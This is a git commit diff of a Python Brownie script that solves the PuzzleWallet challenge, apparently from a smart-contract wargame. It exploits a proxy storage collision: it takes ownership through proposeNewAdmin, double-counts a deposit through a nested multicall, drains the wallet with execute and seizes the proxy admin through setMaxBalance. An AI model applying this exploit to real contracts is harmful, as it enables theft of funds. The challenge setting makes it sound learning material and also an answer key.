a4b6c44d4e769f4654617ac504b7817a48d509cf
Spahr Michael <spahr.michael@protonmail.com>
2022-06-12 13:24:25 +0200

    solve challenge 24 PuzzleWallet

--- scripts/24_deploy.py
+++ scripts/24_deploy.py
@@ -3,7 +3,6 @@ from web3 import Web3
 from web3.auto import w3
 from brownie import (
     PuzzleWalletFactory,
-    PuzzleAttack,
     PuzzleWallet,
     PuzzleProxy,
     network,
@@ -21,98 +20,78 @@ def deploy_PuzzleWallet():
     return proxy
 
 
-def deploy_DexTwoAttack(dex):
-    account = get_account()
-    attack_contract = PuzzleAttack.deploy(
-        {"from": account},
-    )
-    return attack_contract
-
-
-# def int_to_bytes(x: int) -> bytes:
-#     return x.to_bytes((x.bit_length() + 7) // 8, "big")
-
-
 def main():
     print(network.show_active())
     # accounts
     account = get_account()
-    deployer = get_account(index=1)
+    # deployer = get_account(index=1)  # local testing
     print(f"account address: {account}")
-    print(f"deployer address: {deployer}")
+    # print(f"deployer address: {deployer}")  # local testing
 
     # Proxy
-    proxy = deploy_PuzzleWallet()
-    proxy = Contract.from_abi(PuzzleProxy._name, proxy, PuzzleProxy.abi)
+    # proxy = deploy_PuzzleWallet()  # local testing
+    proxy_address = "0x61D1bB51EB0173E114D1ad0A9f95D41c6073D55e"
+    proxy = Contract.from_abi(PuzzleProxy._name, proxy_address, PuzzleProxy.abi)
 
-    print(f"Proxy address: {proxy}")
-    print(f"Proxy pending admin: {proxy.pendingAdmin()}")
+    print(f"Proxy address: {proxy_address}")
+
     print(f"Proxy admin: {proxy.admin()}")
 
-    ## Here we have the storage, we talk to the proxy as if its a PuzzleWallet so when we change storage in proxy, the wallet storage also change
-    instance = Contract.from_abi(PuzzleWallet._name, proxy, PuzzleWallet.abi)
+    # Proxy contract
+    instance = Contract.from_abi(PuzzleWallet._name, proxy_address, PuzzleWallet.abi)
+
+    ### Propose new admin
+    print("\n\n### Changing pendingAdmin and owner")
+    print(f"Proxy pending admin: {proxy.pendingAdmin()}")
     print(f"owner: {instance.owner()}")
-    # Propose new admin
     proxy.proposeNewAdmin(account, {"from": account})
     print(f"Proxy pending admin: {proxy.pendingAdmin()}")
-    # print(f"New owner: {wallet.owner()}")  # still the same owner
-
-    instance = Contract.from_abi(PuzzleWallet._name, proxy, PuzzleWallet.abi)
-
-    print(f"Max Balance: {instance.maxBalance()}")
     print(f"New owner: {instance.owner()}")
 
-    # Get ourselves whitelisted
+    ### Get ourselves whitelisted
+    print("\n\n### Getting whitlisted")
     print(f"Account whitelisted?: {instance.whitelisted(account)}")
     instance.addToWhitelist(account, {"from": account})
     print(f"Account whitelisted?: {instance.whitelisted(account)}")
 
-    # Reduce balance to zero
+    ### Reduce balance to zero
+    print("\n\n### Increasing our balance with multicall")
     wallet_balance = instance.balance()
     print(f"Wallet Balance: {wallet_balance}")
     print(f"Account Balance on wallet: {instance.balances(account)}")
 
-    # create multicall data:
+    ### create multicall calldata:
     # need two call first a deposit then a multicall with deposit
 
-    # find the keccak hash of "deposit()"
+    # method id for the first deposit() call
     deposit_hash = Web3.keccak(text="deposit()")[:4].hex()
-    # hash = hash[: 8 + 2]  # take the first 4 bytes + "0x"
+    # here we encode the calldata to call multicall with one argument, the deposit() call
+    multicall_deposit_calldata = instance.multicall.encode_input([deposit_hash])
+    # we can now packed those two calldata together to have the final argument to give to multicall
+    data = [deposit_hash, multicall_deposit_calldata]
 
-    # ####################
-    # v = 123
-    # a = 3
-    # # encoded_signature = t.getData(v, a)
-    # # print(encoded_signature)
-    # sig = Web3.keccak(text="deposit()")[:4].hex()
-    # # v_hex2 = v.to_bytes.hex()
-    # a_hex2 = int_to_bytes(a).hex()
-    # data = sig + a_hex2 + a_hex2
-    # print(data)
-    # # assert encoded_signature == data
-
-    ######################
-    multicall_hash = Web3.keccak(text="multicall(bytes[])")[:4].hex()
-    multicall_deposit_hash = multicall_hash + deposit_hash[2:]
-    print(multicall_deposit_hash)
-    # w3.eth.send_transaction(
-    #     {
-    #         "to": instance.address,
-    #         "from": account.address,
-    #         "data": data,
-    #         "value": wallet_balance,
-    #     }
-    # )
-    print(f"Wallet Balance: {instance.balance()}")
-    print(f"Account Balance on wallet: {instance.balances(account)}")
-    data = [deposit_hash, multicall_deposit_hash]
-
-    # multicall_with_deposit = Contract.encodeABI(fn_name="deposit", args=["deposit()"])
-    print(data)
-    calldata = instance.multicall.encode_input([deposit_hash])
-    print(calldata)
-    data = [deposit_hash, calldata]
-    print(data)
+    ### multicall call
+    print(f"\nMulticall calldata: {data}")
     instance.multicall(data, {"from": account, "value": wallet_balance})
     print(f"Wallet Balance: {instance.balance()}")
     print(f"Account Balance on wallet: {instance.balances(account)}")
+
+    ### empty the balance
+    print("\n\n### Emptying the balance with execute")
+    instance.execute(
+        account,
+        instance.balances(account),
+        Web3.keccak(text="transfer(int)")[:4].hex(),
+        {"from": account},
+    )
+
+    print(f"Wallet Balance: {instance.balance()}")
+    print(f"Account Balance on wallet: {instance.balances(account)}")
+
+    ### Setting new max balance and new admin
+    print("\n\n### Changing max balance and admin")
+    print(f"Max Balance: {instance.maxBalance()}")
+    print(f"Wallet admin: {proxy.admin()}")
+    instance.setMaxBalance(account.address, {"from": account})
+    print(f"Max Balance: {instance.maxBalance()}")
+    print(f"Wallet admin: {proxy.admin()}")
